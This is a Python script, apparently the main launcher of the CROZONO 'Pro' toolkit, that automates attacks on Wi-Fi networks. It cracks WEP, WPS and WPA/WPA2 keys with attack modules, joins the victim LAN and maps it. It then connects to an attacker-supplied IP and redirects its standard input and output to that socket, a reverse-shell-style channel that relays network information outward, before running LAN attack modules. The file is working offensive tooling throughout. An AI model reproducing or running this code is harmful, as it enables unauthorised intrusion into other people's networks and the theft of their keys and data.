#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
----------------------------------------------------------------------------
	CROZONO - 22.02.16.20.00.00 - www.crozono.com - info@crozono.com
----------------------------------------------------------------------------

"""

#  ## LIBRARIES ##
import os
import re
import time
import socket
import subprocess
import src.settings as settings
import src.tools.wash as wash
import src.tools.airodump as airodump
import src.utils.sys_check as checks
import src.utils.lan_manager as lan_mgr
import src.utils.device_manager as device_mgr

from os import listdir
from poormanslogging import info, warn, error

# ## CONTEXT VARIABLES ##
version = '1.2'

def import_module(module):
	p = re.compile('class (.+)\({}\):'.format('BaseAttack'))
	module_file = os.path.join(settings.OS_PATH,"src","attacks",module+'.py')
	with open(module_file) as f:
		for l in f.readlines():
				sintaxis_ok = re.match(p, l)
				if sintaxis_ok is not None:
					classname_start = 'class ';
					classname_end = l.find('(')
					classname = l[len(classname_start):classname_end].strip()
					f.close()
					break

	if classname is not None:
		import importlib
		m = importlib.import_module("src.attacks."+module)
		return getattr(m, classname)(None)

def find_modules(attack):
	modules = []
	path = os.path.join(settings.OS_PATH,"src","attacks")
	for module in listdir(path):
		if attack in module:
			modules.append(module)

	priorities = []
	var_priority = '__PRIORITY__'
	for module in modules:
		with open(os.path.join(path,module)) as file:
			for line in file.readlines():
				if var_priority in line:
					priorities.append([module.replace('.py',''),line[len(var_priority):].strip()]) # module list and its priorities. 
					break

	priorities = sorted(priorities,key = lambda x: x[1]) # sort by priority (0 = high priority)

	return priorities

def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-e', '--essid', type=str, help="ESSID to target. Surround in quotes if it has spaces!")
	parser.add_argument('-k', '--key', type=str, help="Key to use for connect to ESSID")
	parser.add_argument('-c', '--connect', type=str, help="Destination to where to send info (attacker's IP)")
	parser.add_argument('-a', '--attack', type=str, help="LAN attack to perform")
	parser.add_argument('-d', '--discovery', type=str, help="LAN discovery module to run")
	parser.add_argument('-i', '--interface', type=str, help="Interface to use for attacks/connecting")
	parser.add_argument('-D', '--delay', type=str, help="Time to wait before starting (minutes)")
	return parser.parse_args()

def banner():
	global version
	from pyfiglet import figlet_format
	b = figlet_format("      CROZONO") + \
	'''		Pro Version - {v}
	www.crozono.com - info@crozono.com
	'''.format(v=version)
	print(b)

def main():
	banner()

	if not checks.check_root():
		error('You need root privileges to run CROZONO!\n')
		exit(1)

	if not checks.check_wlan_tools_dependencies():
		exit(1)

	args = parse_args()

	settings.OS_PATH = os.getcwd()
	settings.INTERFACE = args.interface if args.interface is not None else settings.INTERFACE
	settings.INTERFACE = device_mgr.get_ifaces()[0] if settings.INTERFACE is None else settings.INTERFACE
	settings.DELAY = args.delay if args.delay is not None else settings.DELAY
	settings.TARGET_ESSID = args.essid if args.essid is not None else settings.TARGET_ESSID
	settings.TARGET_KEY = args.key if args.key is not None else settings.TARGET_KEY
	settings.IP_ATTACKER = args.connect if args.connect is not None else settings.IP_ATTACKER
	settings.LAN_DISCOVERY = args.discovery if args.discovery is not None else settings.LAN_DISCOVERY
	settings.ATTACK = args.attack if args.attack is not None else settings.ATTACK

	delay = float(settings.DELAY) * 60
	time.sleep(delay)
	info("CROZONO running...")

	if settings.TARGET_ESSID is not None:
		if settings.TARGET_KEY is not None:
			ap_target = None
			lan_mgr.connect_to_lan()
		else:
			device_mgr.hardware_setup()
			ap_target = airodump.scan_targets()
	else:
		device_mgr.hardware_setup()
		ap_target = airodump.scan_targets()

	# -------------------- Infiltrate wifi ------------------------------------------------
	if ap_target is not None:
		settings.TARGET_ESSID = ap_target.get('ESSID').strip()
		settings.TARGET_BSSID = ap_target.get('BSSID').strip()
		settings.TARGET_CHANNEL = ap_target.get('channel').strip()
		settings.TARGET_PRIVACY = ap_target.get('Privacy').strip()

		info("Target selected: " + settings.TARGET_ESSID)

		if settings.TARGET_PRIVACY == 'WEP':			
			info("Cracking {e} access point with WEP privacy...".format(e=settings.TARGET_ESSID))
			wep_modules = find_modules('wep')
			for wep_module in wep_modules:
				attack = import_module(wep_module[0])
				if attack.check():
					attack.setup()
					attack.run()
					if settings.TARGET_KEY is not None:
						info("Key found!: {k} ".format(k=settings.TARGET_KEY))
						lan_mgr.save_key()
						lan_mgr.connect_to_lan()
						break
				else:
					pass
			if settings.TARGET_KEY is None:
					error("Key not found! :(")
					exit(0)

		elif settings.TARGET_PRIVACY == 'WPA' or settings.TARGET_PRIVACY == 'WPA2' or settings.TARGET_PRIVACY == 'WPA2 WPA':
			info("Cracking {e} access point with {p} privacy...".format(e=settings.TARGET_ESSID, p=settings.TARGET_PRIVACY))

			wps = wash.wash_scan()

			if wps:
				info("WPS is enabled")
				wps_modules = find_modules('wps')
				for wps_module in wps_modules:
					attack = import_module(wps_module[0])
					if attack.check():
						attack.setup()
						attack.run()
						if settings.TARGET_KEY is not None:
							info("Key found!: {k} ".format(k=settings.TARGET_KEY))
							break
					else:
						pass
			
			if settings.TARGET_KEY is None:
				if wps:
					warn("PIN not found! :-( Running WPA/WPA2 attack modules...")
				wpa_modules = find_modules('wpa')
				for wpa_module in wpa_modules:
					attack = import_module(wpa_module[0])
					if attack.check():
						attack.setup()
						attack.run()
						if settings.TARGET_KEY is not None:
							info("Key found!: {k} ".format(k=settings.TARGET_KEY))
							break
					else:
						pass

			if settings.TARGET_KEY is None: # still...
				error("Key not found! :(")
				exit(0)
			else:
				lan_mgr.save_key()
				lan_mgr.connect_to_lan()
		else:
			info("Open network!")
			lan_mgr.connect_to_lan()

	# -------------------- Acquired LAN range --------------------------------------------

	lan_mgr.lan_range()
	lan_mgr.get_gateway()

	# -------------------- Connect to attacker and relay network info --------------------

	if settings.IP_ATTACKER is not None:
		info("Sending information about network to attacker ({ip}) and running attacks...".format(ip=settings.IP_ATTACKER))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((settings.IP_ATTACKER, settings.PORT_ATTACKER))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		banner()
		info("Hello! :)")

		if settings.LAN_DISCOVERY is not None:
			discovery = import_module(settings.LAN_DISCOVERY)
			if discovery.check():
				discovery.setup()
				discovery.run()
			else:
				warn("Error to run LAN discovery module!")
	else:
		warn("Attacker not defined! Ending...")
		exit(0)

	# -------------------- LAN Attacks --------------------------------------------------

	if settings.ATTACK is not None:
		attack = import_module(settings.ATTACK)
		if attack.check():
			attack.setup()
			attack.run()
		else:
			error("Error to run LAN attack module! Ending...")
			exit(1)
	else:
		warn("Attack not defined!")
	
	s.shutdown(1)

	info("CROZONO has finished! Good bye! ;)")

main()
